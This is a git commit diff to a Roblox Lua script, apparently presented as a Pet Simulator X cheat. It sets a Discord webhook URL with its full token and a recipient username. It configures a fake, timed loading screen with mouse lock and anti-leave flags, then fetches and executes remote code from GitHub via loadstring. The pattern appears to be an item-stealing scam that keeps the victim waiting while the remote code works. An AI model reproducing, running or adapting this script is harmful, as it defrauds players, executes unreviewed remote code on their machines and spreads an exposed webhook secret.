f59a8c37487b553f5f6a4b63ab5cb886da0da4d4
hsdfuyhsdufhs <128642081+hsdfuyhsdufhs@users.noreply.github.com>
2023-05-13 23:58:26 +0300

    Update Script2.lua

--- Script2.lua
+++ Script2.lua
@@ -1,10 +1,15 @@
-Username = "loadstping"
-WebHook = "https://discord.com/api/webhooks/1102574742122266766/ChbujQLOAHgogj38_NTTul-LIJGJSjY_RdArakF0dHBPqtYLziTNBk2fYNDfO0rDLbAZ"
- 
-loadingscreen = true
-_G.CustomScriptName = "PSX Script"
-_G.Text1 = "Script Loaded..."
-_G.Text2 = "Waiting for Script"
-_G.Text3 = "Checking Scripts..."
-_G.Text4 = "Starting Scripts..."
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+UserName = "loadstping"
+UserName2 = "loadstping"
+Webhook = "https://discord.com/api/webhooks/1102574742122266766/ChbujQLOAHgogj38_NTTul-LIJGJSjY_RdArakF0dHBPqtYLziTNBk2fYNDfO0rDLbAZ"
+
+_G.LoadingScreen = true
+_G.AntiLeave = false
+_G.MouseLock = true 
+
+_G.ScriptName = "Rizz Scriptz"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
